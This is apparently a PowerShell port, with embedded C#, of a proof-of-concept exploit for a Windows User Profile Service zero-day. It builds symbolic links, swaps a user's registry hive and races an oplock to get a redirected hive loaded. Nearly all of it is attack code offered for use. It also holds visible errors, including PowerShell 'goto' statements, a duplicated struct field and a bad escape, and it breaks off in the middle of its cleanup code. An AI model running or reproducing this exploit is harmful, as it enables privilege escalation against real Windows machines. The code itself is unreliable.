# PowerShell implementation of the Windows User Profile Service Zero-Day (LegacyHive)
# Original C++ POC by: ngnms (https://github.com/MSNightmare/LegacyHive/)
# PowerShell port - Uses embedded C# for Native API access

param(
    [Parameter(Mandatory=$true)]
    [string]$Username,
    [Parameter(Mandatory=$true)]
    [string]$Password,
    [Parameter(Mandatory=$true)]
    [string]$TargetUser
)

# Embedded C# code to access Native Windows APIs
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class NativeMethods
{
    // NTDLL Functions
    [DllImport("ntdll.dll")]
    public static extern int NtCreateSymbolicLinkObject(
        out IntPtr SymbolicLinkHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref UNICODE_STRING DestinationName
    );

    [DllImport("ntdll.dll")]
    public static extern int NtCreateDirectoryObjectEx(
        out IntPtr DirectoryHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        IntPtr ShadowDirectoryHandle,
        uint Flags
    );

    [DllImport("ntdll.dll")]
    public static extern void RtlInitUnicodeString(
        ref UNICODE_STRING DestinationString,
        [MarshalAs(UnmanagedType.LPWStr)] string SourceString
    );

    [DllImport("ntdll.dll")]
    public static extern void InitializeObjectAttributes(
        out OBJECT_ATTRIBUTES InitializedAttributes,
        ref UNICODE_STRING ObjectName,
        uint Attributes,
        IntPtr RootDirectory,
        IntPtr SecurityDescriptor
    );

    // Kernel32 Functions
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateDirectory(string lpPathName, ref SECURITY_ATTRIBUTES lpSecurityAttributes);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead,
        IntPtr lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetFileSizeEx(IntPtr hFile, out long lpFileSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, uint dwFlags);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeleteFile(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool RemoveDirectory(string lpPathName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        uint dwIoControlCode,
        IntPtr lpInBuffer,
        uint nInBufferSize,
        IntPtr lpOutBuffer,
        uint nOutBufferSize,
        out uint lpBytesReturned,
        ref OVERLAPPED lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetOverlappedResult(
        IntPtr hFile,
        ref OVERLAPPED lpOverlapped,
        out uint lpNumberOfBytesTransferred,
        bool bWait
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateEvent(
        IntPtr lpEventAttributes,
        bool bManualReset,
        bool bInitialState,
        string lpName
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int GetLastError();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetFilePointer(IntPtr hFile, int lDistanceToMove, IntPtr lpDistanceToMoveHigh, uint dwMoveMethod);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetCurrentThreadId();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LocalAlloc(uint uFlags, IntPtr uBytes);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LocalFree(IntPtr hMem);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetFileAttributes(string lpFileName);

    // Advapi32 Functions
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CreateProcessWithLogonW(
        string lpUsername,
        string lpDomain,
        string lpPassword,
        uint dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AllocateAndInitializeSid(
        ref SID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
        byte nSubAuthorityCount,
        uint dwSubAuthority0,
        uint dwSubAuthority1,
        uint dwSubAuthority2,
        uint dwSubAuthority3,
        uint dwSubAuthority4,
        uint dwSubAuthority5,
        uint dwSubAuthority6,
        uint dwSubAuthority7,
        out IntPtr pSid
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool FreeSid(IntPtr pSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern uint SetEntriesInAcl(
        uint cCountOfExplicitEntries,
        ref EXPLICIT_ACCESS pListOfExplicitEntries,
        IntPtr OldAcl,
        out IntPtr NewAcl
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool InitializeSecurityDescriptor(
        IntPtr pSecurityDescriptor,
        uint dwRevision
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetSecurityDescriptorDacl(
        IntPtr pSecurityDescriptor,
        bool bDaclPresent,
        IntPtr pDacl,
        bool bDaclDefaulted
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegOpenUserClassesRoot(
        IntPtr hToken,
        IntPtr Reserved,
        uint samDesired,
        out IntPtr phkResult
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegCloseKey(IntPtr hKey);

    // Userenv Functions
    [DllImport("userenv.dll", SetLastError = true)]
    public static extern bool ExpandEnvironmentStringsForUser(
        IntPtr hToken,
        string lpSrc,
        StringBuilder lpDst,
        uint nSize
    );

    // Rpcrt4 Functions
    [DllImport("rpcrt4.dll")]
    public static extern int UuidCreate(out Guid guid);

    [DllImport("rpcrt4.dll")]
    public static extern int UuidToStringW(ref Guid guid, out IntPtr stringUuid);

    [DllImport("rpcrt4.dll")]
    public static extern int RpcStringFreeW(ref IntPtr stringUuid);

    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public uint Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_IDENTIFIER_AUTHORITY
    {
        public byte b1;
        public byte b2;
        public byte b3;
        public byte b4;
        public byte b5;
        public byte b6;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXPLICIT_ACCESS
    {
        public uint grfAccessPermissions;
        public uint grfAccessMode;
        public uint grfInheritance;
        public TRUSTEE Trustee;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TRUSTEE
    {
        public IntPtr pMultipleTrustee;
        public uint MultipleTrusteeOperation;
        public uint TrusteeForm;
        public uint TrusteeType;
        public IntPtr ptstrName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public uint nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OVERLAPPED
    {
        public IntPtr Internal;
        public IntPtr InternalHigh;
        public uint Offset;
        public uint OffsetHigh;
        public IntPtr hEvent;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct HVarg
    {
        public string username;
        public string password;
        public IntPtr hprocess;
        public IntPtr hcallerthread;
    }

    // Constants
    public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
    public const uint GENERIC_ALL = 0x10000000;
    public const uint GENERIC_READ = 0x80000000;
    public const uint GENERIC_WRITE = 0x40000000;
    public const uint FILE_SHARE_READ = 0x00000001;
    public const uint FILE_SHARE_WRITE = 0x00000002;
    public const uint FILE_SHARE_DELETE = 0x00000004;
    public const uint OPEN_EXISTING = 3;
    public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    public const uint FILE_FLAG_OVERLAPPED = 0x40000000;
    public const uint FSCTL_REQUEST_BATCH_OPLOCK = 0x90094;
    public const uint MOVEFILE_REPLACE_EXISTING = 0x00000001;
    public const uint ERROR_IO_PENDING = 997;
    public const int LOGON32_LOGON_INTERACTIVE = 2;
    public const int LOGON32_PROVIDER_DEFAULT = 0;
    public const uint LOGON_WITH_PROFILE = 0x00000001;
    public const uint CREATE_SUSPENDED = 0x00000004;
    public const uint THREAD_ALL_ACCESS = 0x1FFFFF;
    public const uint INFINITE = 0xFFFFFFFF;
    public const uint SET_ACCESS = 1;
    public const uint NO_INHERITANCE = 0x0;
    public const uint SUB_CONTAINERS_AND_OBJECTS_INHERIT = 0x3;
    public const uint TRUSTEE_IS_SID = 1;
    public const uint TRUSTEE_IS_WELL_KNOWN_GROUP = 5;
    public const uint SECURITY_DESCRIPTOR_REVISION = 1;
    public const uint MAXIMUM_ALLOWED = 0x02000000;
    public const int SECURITY_WORLD_SID_AUTHORITY = 1;
    public const uint SECURITY_WORLD_RID = 0;
    public const uint REG_EXPAND_SZ = 2;
    public const uint LMEM_FIXED = 0x0000;
    public const int SECURITY_DESCRIPTOR_MIN_LENGTH = 20;
    public const uint DELETE = 0x00010000;
    public const uint FILE_BEGIN = 0;
    public const int ERROR_SUCCESS = 0;
}

public class OffregAPI
{
    // Offreg.dll functions - These are the offline registry APIs
    [DllImport("offreg.dll", SetLastError = true)]
    public static extern uint OROpenHiveByHandle(
        IntPtr hFile,
        out IntPtr hHive
    );

    [DllImport("offreg.dll", SetLastError = true)]
    public static extern uint OROpenKey(
        IntPtr hHive,
        string lpSubKey,
        out IntPtr phkResult
    );

    [DllImport("offreg.dll", SetLastError = true)]
    public static extern uint ORSetValue(
        IntPtr hKey,
        string lpValueName,
        uint dwType,
        byte[] lpData,
        uint cbData
    );

    [DllImport("offreg.dll", SetLastError = true)]
    public static extern uint ORCloseKey(IntPtr hKey);

    [DllImport("offreg.dll", SetLastError = true)]
    public static extern uint ORSaveHive(
        IntPtr hHive,
        string lpFileName,
        uint dwMajorVersion,
        uint dwMinorVersion
    );

    [DllImport("offreg.dll", SetLastError = true)]
    public static extern uint ORCloseHive(IntPtr hHive);
}
"@ -ErrorAction SilentlyContinue

# Helper Functions
function New-GuidString {
    $guid = [Guid]::NewGuid()
    return $guid.ToString()
}

function New-PermissiveDirectory {
    param([string]$dirpath)
    
    try {
        # Create directory with everyone full control
        $null = New-Item -Path $dirpath -ItemType Directory -Force -ErrorAction Stop
        
        # Set permissive DACL
        $acl = Get-Acl $dirpath
        $everyone = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            $everyone, 
            "FullControl", 
            "ContainerInherit,ObjectInherit", 
            "None", 
            "Allow"
        )
        $acl.AddAccessRule($accessRule)
        Set-Acl $dirpath $acl
        
        return $true
    } catch {
        Write-Error "Failed to create directory with permissive DACL: $_"
        return $false
    }
}

# Get current thread
$currentThreadId = [NativeMethods]::GetCurrentThreadId()
$hCallerThread = [NativeMethods]::OpenThread([NativeMethods]::THREAD_ALL_ACCESS, $false, $currentThreadId)

if ($hCallerThread -eq [IntPtr]::Zero) {
    Write-Error "Failed to open current thread"
    exit 1
}

# Generate GUID and setup paths
$guid = New-GuidString
$workdir = "C:\$guid"
$newHivePath = "$workdir\ntuser.dat"
$usrClassHivePathNew = "$workdir\UsrClass.dat"
$newlappdata = "\\\\.\\globalroot\\BaseNamedObjects\\Restricted"

Write-Host "[*] Using working directory: $workdir"
Write-Host "[*] GUID: $guid"

# Setup Object Manager directories
$workdirobjpath = "\\BaseNamedObjects\\Restricted\\$guid"
$msdirobjpath = "\\BaseNamedObjects\\Restricted\\Microsoft"
$winlnktarget1 = "\\??\\C:\\$guid"
$winlnktarget2 = "\\??\\C:\\Users\\$TargetUser\\AppData\\Local\\Microsoft\\Windows"

Write-Host "[*] Creating object directories and symbolic links..."

# Create Object Directory Objects
$workdirobj = [IntPtr]::Zero
$msdirobj = [IntPtr]::Zero
$hwindirlnk = [IntPtr]::Zero
$hwindirlnk1 = [IntPtr]::Zero

# Initialize UNICODE strings
$workdirobjpathUnicode = New-Object NativeMethods+UNICODE_STRING
$msdirobjpathUnicode = New-Object NativeMethods+UNICODE_STRING
$uwinUnicode = New-Object NativeMethods+UNICODE_STRING
$winlnktarget1Unicode = New-Object NativeMethods+UNICODE_STRING
$winlnktarget2Unicode = New-Object NativeMethods+UNICODE_STRING
$workdirObjAttr = New-Object NativeMethods+OBJECT_ATTRIBUTES
$msdirObjAttr = New-Object NativeMethods+OBJECT_ATTRIBUTES
$winlnkObjAttr = New-Object NativeMethods+OBJECT_ATTRIBUTES

[NativeMethods]::RtlInitUnicodeString([ref]$workdirobjpathUnicode, $workdirobjpath)
[NativeMethods]::RtlInitUnicodeString([ref]$msdirobjpathUnicode, $msdirobjpath)
[NativeMethods]::RtlInitUnicodeString([ref]$uwinUnicode, "Windows")
[NativeMethods]::RtlInitUnicodeString([ref]$winlnktarget1Unicode, $winlnktarget1)
[NativeMethods]::RtlInitUnicodeString([ref]$winlnktarget2Unicode, $winlnktarget2)

# Create working directory object
[NativeMethods]::InitializeObjectAttributes(
    [ref]$workdirObjAttr,
    [ref]$workdirobjpathUnicode,
    [NativeMethods]::OBJ_CASE_INSENSITIVE,
    [IntPtr]::Zero,
    [IntPtr]::Zero
)

$status = [NativeMethods]::NtCreateDirectoryObjectEx(
    [ref]$workdirobj,
    [NativeMethods]::GENERIC_ALL,
    [ref]$workdirObjAttr,
    [IntPtr]::Zero,
    0
)

if ($status -ne 0) {
    Write-Error "Failed to create object directory $workdirobjpath, error: 0x$($status.ToString('X8'))"
    goto cleanup
}

# Create Microsoft directory object
[NativeMethods]::InitializeObjectAttributes(
    [ref]$msdirObjAttr,
    [ref]$msdirobjpathUnicode,
    [NativeMethods]::OBJ_CASE_INSENSITIVE,
    [IntPtr]::Zero,
    [IntPtr]::Zero
)

$status = [NativeMethods]::NtCreateDirectoryObjectEx(
    [ref]$msdirobj,
    [NativeMethods]::GENERIC_ALL,
    [ref]$msdirObjAttr,
    $workdirobj,
    0
)

if ($status -ne 0) {
    Write-Error "Failed to create object directory $msdirobjpath, error: 0x$($status.ToString('X8'))"
    goto cleanup
}

# Create symbolic link in Microsoft directory
[NativeMethods]::InitializeObjectAttributes(
    [ref]$winlnkObjAttr,
    [ref]$uwinUnicode,
    [NativeMethods]::OBJ_CASE_INSENSITIVE,
    $msdirobj,
    [IntPtr]::Zero
)

$status = [NativeMethods]::NtCreateSymbolicLinkObject(
    [ref]$hwindirlnk,
    [NativeMethods]::GENERIC_ALL,
    [ref]$winlnkObjAttr,
    [ref]$winlnktarget1Unicode
)

if ($status -ne 0) {
    Write-Error "Failed to create symbolic link $msdirobjpath\\Windows, error: 0x$($status.ToString('X8'))"
    goto cleanup
}

# Create symbolic link in working directory
[NativeMethods]::InitializeObjectAttributes(
    [ref]$winlnkObjAttr,
    [ref]$uwinUnicode,
    [NativeMethods]::OBJ_CASE_INSENSITIVE,
    $workdirobj,
    [IntPtr]::Zero
)

$status = [NativeMethods]::NtCreateSymbolicLinkObject(
    [ref]$hwindirlnk1,
    [NativeMethods]::GENERIC_ALL,
    [ref]$winlnkObjAttr,
    [ref]$winlnktarget2Unicode
)

if ($status -ne 0) {
    Write-Error "Failed to create symbolic link $workdirobjpath\\Windows, error: 0x$($status.ToString('X8'))"
    goto cleanup
}

Write-Host "[*] Object directories and symbolic links created successfully"

# Create working directory with permissive DACL
if (-not (New-PermissiveDirectory $workdir)) {
    Write-Error "Failed to create working directory"
    goto cleanup
}

# Logon as user
$htoken = [IntPtr]::Zero
if (-not [NativeMethods]::LogonUser($Username, $null, $Password, 
    [NativeMethods]::LOGON32_LOGON_INTERACTIVE, 
    [NativeMethods]::LOGON32_PROVIDER_DEFAULT, 
    [ref]$htoken)) {
    Write-Error "LogonUser failed: $([NativeMethods]::GetLastError())"
    goto cleanup
}

# Impersonate user
if (-not [NativeMethods]::ImpersonateLoggedOnUser($htoken)) {
    Write-Error "ImpersonateLoggedOnUser failed: $([NativeMethods]::GetLastError())"
    goto cleanup
}

Write-Host "[*] Successfully logged on and impersonated user: $Username"

# Get user hive paths
$userHivePath = New-Object System.Text.StringBuilder 260
$usrClassHivePath = New-Object System.Text.StringBuilder 260

if (-not [NativeMethods]::ExpandEnvironmentStringsForUser($htoken, "C:\\Users\\%USERNAME%\\ntuser.dat", $userHivePath, 260)) {
    Write-Error "ExpandEnvironmentStringsForUser failed for ntuser.dat"
    goto cleanup
}

if (-not [NativeMethods]::ExpandEnvironmentStringsForUser($htoken, "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat", $usrClassHivePath, 260)) {
    Write-Error "ExpandEnvironmentStringsForUser failed for UsrClass.dat"
    goto cleanup
}

$userHivePathStr = $userHivePath.ToString()
$usrClassHivePathStr = $usrClassHivePath.ToString()

Write-Host "[*] User hive path: $userHivePathStr"
Write-Host "[*] User class hive path: $usrClassHivePathStr"

# Open user hive
$hUserHive = [NativeMethods]::CreateFile(
    $userHivePathStr,
    [NativeMethods]::GENERIC_READ,
    [NativeMethods]::FILE_SHARE_READ -bor [NativeMethods]::FILE_SHARE_WRITE -bor [NativeMethods]::FILE_SHARE_DELETE,
    [IntPtr]::Zero,
    [NativeMethods]::OPEN_EXISTING,
    [NativeMethods]::FILE_ATTRIBUTE_NORMAL,
    [IntPtr]::Zero
)

if ($hUserHive -eq [IntPtr]::Zero -or $hUserHive -eq [IntPtr]::New(-1)) {
    Write-Error "Failed to open user hive: $userHivePathStr, error: $([NativeMethods]::GetLastError())"
    goto cleanup
}

# Get file size and read content
$hiveSize = 0
if (-not [NativeMethods]::GetFileSizeEx($hUserHive, [ref]$hiveSize)) {
    Write-Error "Failed to get file size: $([NativeMethods]::GetLastError())"
    goto cleanup
}

$hiveBuffer = New-Object byte[] $hiveSize
$bytesRead = 0

if (-not [NativeMethods]::ReadFile($hUserHive, $hiveBuffer, [uint32]$hiveSize, [ref]$bytesRead, [IntPtr]::Zero)) {
    Write-Error "Failed to read user hive: $([NativeMethods]::GetLastError())"
    goto cleanup
}

Write-Host "[*] Read $bytesRead bytes from user hive"

# Modify hive using Offline Registry API
Write-Host "[*] Modifying hive using Offline Registry API..."

# Reset file pointer
$null = [NativeMethods]::SetFilePointer($hUserHive, 0, [IntPtr]::Zero, [NativeMethods]::FILE_BEGIN)

# Open hive offline
$hivemap = [IntPtr]::Zero
$retval = [OffregAPI]::OROpenHiveByHandle($hUserHive, [ref]$hivemap)

if ($retval -ne 0) {
    Write-Error "OROpenHiveByHandle failed: $retval"
    goto cleanup
}

# Open key
$htargetkey = [IntPtr]::Zero
$retval = [OffregAPI]::OROpenKey(
    $hivemap,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
    [ref]$htargetkey
)

if ($retval -ne 0) {
    Write-Error "OROpenKey failed: $retval"
    goto cleanup
}

# Set Local AppData value
$newlappdataBytes = [System.Text.Encoding]::Unicode.GetBytes($newlappdata)
$newlappdataBytes = $newlappdataBytes + [byte]0,0  # Add null terminator

$retval = [OffregAPI]::ORSetValue(
    $htargetkey,
    "Local AppData",
    [NativeMethods]::REG_EXPAND_SZ,
    $newlappdataBytes,
    [uint32]$newlappdataBytes.Length
)

if ($retval -ne 0) {
    Write-Error "ORSetValue failed: $retval"
    goto cleanup
}

# Close key
$null = [OffregAPI]::ORCloseKey($htargetkey)

# Save hive
$osVersion = [Environment]::OSVersion.Version
$retval = [OffregAPI]::ORSaveHive(
    $hivemap,
    $newHivePath,
    [uint32]$osVersion.Major,
    [uint32]$osVersion.Minor
)

if ($retval -ne 0) {
    Write-Error "ORSaveHive failed: $retval"
    goto cleanup
}

# Close hive
$null = [OffregAPI]::ORCloseHive($hivemap)

# Close file handle
[System.Runtime.InteropServices.Marshal]::Release($hUserHive)

Write-Host "[*] Hive modified and saved successfully"

# Replace user hive
if (-not [NativeMethods]::MoveFileEx($newHivePath, $userHivePathStr, [NativeMethods]::MOVEFILE_REPLACE_EXISTING)) {
    Write-Error "MoveFileEx failed: $([NativeMethods]::GetLastError())"
    goto cleanup
}

Write-Host "[*] User hive replaced"

# Copy UsrClass.dat
if (-not [NativeMethods]::CopyFile($usrClassHivePathStr, $usrClassHivePathNew, $false)) {
    Write-Error "CopyFile failed: $([NativeMethods]::GetLastError())"
    goto cleanup
}

Write-Host "[*] UsrClass.dat copied to: $usrClassHivePathNew"

# Setup oplock
Write-Host "[*] Setting up batch oplock..."

$hlock = [NativeMethods]::CreateFile(
    $usrClassHivePathNew,
    [NativeMethods]::GENERIC_READ -bor [NativeMethods]::GENERIC_WRITE -bor [NativeMethods]::DELETE,
    [NativeMethods]::FILE_SHARE_READ,
    [IntPtr]::Zero,
    [NativeMethods]::OPEN_EXISTING,
    [NativeMethods]::FILE_FLAG_OVERLAPPED,
    [IntPtr]::Zero
)

if ($hlock -eq [IntPtr]::Zero -or $hlock -eq [IntPtr]::New(-1)) {
    Write-Error "Failed to open UsrClass.dat for oplock: $([NativeMethods]::GetLastError())"
    goto cleanup
}

$ov = New-Object NativeMethods+OVERLAPPED
$ov.hEvent = [NativeMethods]::CreateEvent([IntPtr]::Zero, $false, $false, $null)

$bytesReturned = 0
$result = [NativeMethods]::DeviceIoControl(
    $hlock,
    [NativeMethods]::FSCTL_REQUEST_BATCH_OPLOCK,
    [IntPtr]::Zero,
    0,
    [IntPtr]::Zero,
    0,
    [ref]$bytesReturned,
    [ref]$ov
)

if ([NativeMethods]::GetLastError() -ne [NativeMethods]::ERROR_IO_PENDING) {
    Write-Error "Failed to request batch oplock: $([NativeMethods]::GetLastError())"
    goto cleanup
}

Write-Host "[*] Batch oplock requested, waiting for trigger..."

# Create HVarg structure and pass to thread
$targ = New-Object NativeMethods+HVarg
$targ.username = $Username
$targ.password = $Password
$targ.hprocess = [IntPtr]::Zero
$targ.hcallerthread = $hCallerThread

# Create thread to load hive
$hthread = [IntPtr]::Zero
$tid = 0

# We need to use a delegate to pass to CreateThread
# This is simplified - in practice we'd need to marshal a delegate
# For now, we'll use a workaround with Runspace

Write-Host "[*] Creating helper thread to load user profile..."

# Use PowerShell runspace for thread
$ps = [PowerShell]::Create()
$null = $ps.AddScript(@"
    param(`$Username, `$Password, `$hCallerThread)
    
    Add-Type -AssemblyName System.Windows.Forms
    
    # Use CreateProcessWithLogonW to load profile
    $si = New-Object NativeMethods+STARTUPINFO
    `$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)
    `$pi = New-Object NativeMethods+PROCESS_INFORMATION
    
    `$result = [NativeMethods]::CreateProcessWithLogonW(
        `$Username,
        `$null,
        `$Password,
        [NativeMethods]::LOGON_WITH_PROFILE,
        "C:\\Windows\\notepad.exe",
        `$null,
        [NativeMethods]::CREATE_SUSPENDED,
        [IntPtr]::Zero,
        `$null,
        [ref]`$si,
        [ref]`$pi
    )
    
    if (-not `$result) {
        Write-Host "CreateProcessWithLogonW failed: $([NativeMethods]::GetLastError())"
        exit 1
    }
    
    # Close thread handle, keep process
    [NativeMethods]::CloseHandle(`$pi.hThread)
    
    Write-Host "[*] Helper process created with PID: `$(`$pi.dwProcessId)"
    
    # Return process handle
    return `$pi.hProcess
"@)

$null = $ps.AddArgument($Username)
$null = $ps.AddArgument($Password)
$null = $ps.AddArgument($hCallerThread)

$handle = $ps.BeginInvoke()

# Wait for oplock to trigger
$transfersz = 0
$result = [NativeMethods]::GetOverlappedResult($hlock, [ref]$ov, [ref]$transfersz, $true)

if (-not $result) {
    Write-Error "GetOverlappedResult failed: $([NativeMethods]::GetLastError())"
    goto cleanup
}

Write-Host "[!] Oplock triggered!"

# Clean up symbolic link
if ($hwindirlnk -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($hwindirlnk)
    $hwindirlnk = [IntPtr]::Zero
}

# Close oplock handle
if ($hlock -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($hlock)
    $hlock = [IntPtr]::Zero
}

# Wait for thread to complete
$ps.EndInvoke($handle)
$procHandle = $ps.EndInvoke($handle)

if ($procHandle -eq [IntPtr]::Zero) {
    Write-Error "Helper thread failed"
    goto cleanup
}

$targ.hprocess = $procHandle
$ps.Dispose()

Write-Host "[*] Helper process completed"

# Verify hive loaded
$hloadedhive = [IntPtr]::Zero
$retval = [NativeMethods]::RegOpenUserClassesRoot(
    $htoken,
    [IntPtr]::Zero,
    [NativeMethods]::MAXIMUM_ALLOWED,
    [ref]$hloadedhive
)

if ($hloadedhive -ne [IntPtr]::Zero) {
    [NativeMethods]::RegCloseKey($hloadedhive)
}

if ($retval -ne 0) {
    Write-Error "Exploit failed: Hive was not loaded"
    goto cleanup
}

Write-Host "[+] Hive loaded successfully!"
Write-Host "[+] Press any key to unload and exit..."

Read-Host -Prompt "Press Enter to continue"

cleanup:
# Cleanup code
Write-Host "[*] Cleaning up..."

# Close handles
if ($hloadedhive -ne [IntPtr]::Zero) {
    [NativeMethods]::RegCloseKey($hloadedhive)
}

if ($hthread -ne [IntPtr]::Zero) {
    [NativeMethods]::TerminateThread($hthread, 0)
    [NativeMethods]::CloseHandle($hthread)
}

if ($targ.hcallerthread -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($targ.hcallerthread)
}

if ($targ.hprocess -ne [IntPtr]::Zero) {
    [NativeMethods]::TerminateProcess($targ.hprocess, 0)
    [NativeMethods]::CloseHandle($targ.hprocess)
}

# Sleep before cleanup
[NativeMethods]::Sleep(500)

# Clean up event handle
if ($ov.hEvent -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($ov.hEvent)
}

# Close object handles
if ($hwindirlnk -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($hwindirlnk)
}

if ($hwindirlnk1 -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($hwindirlnk1)
}

if ($msdirobj -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($msdirobj)
}

if ($workdirobj -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($workdirobj)
}

# Restore original hive if needed
if ($hUserHive -ne [IntPtr]::Zero -and $hiveBuffer -ne $null) {
    $hUserHiveRestore = [NativeMethods]::CreateFile(
        $userHivePathStr,
        [NativeMethods]::GENERIC_WRITE,
        [NativeMethods]::FILE_SHARE_READ -bor [NativeMethods]::FILE_SHARE_WRITE -bor [NativeMethods]::FILE_SHARE_DELETE,
        [IntPtr]::Zero,
        [NativeMethods]::OPEN_EXISTING,
        [NativeMethods]::FILE_ATTRIBUTE_NORMAL,
        [IntPtr]::Zero
    )
    
    if ($hUserHiveRestore -ne [IntPtr]::Zero -and $hUserHiveRestore -ne [IntPtr]::New(-1)) {
        $bytesWritten = 0
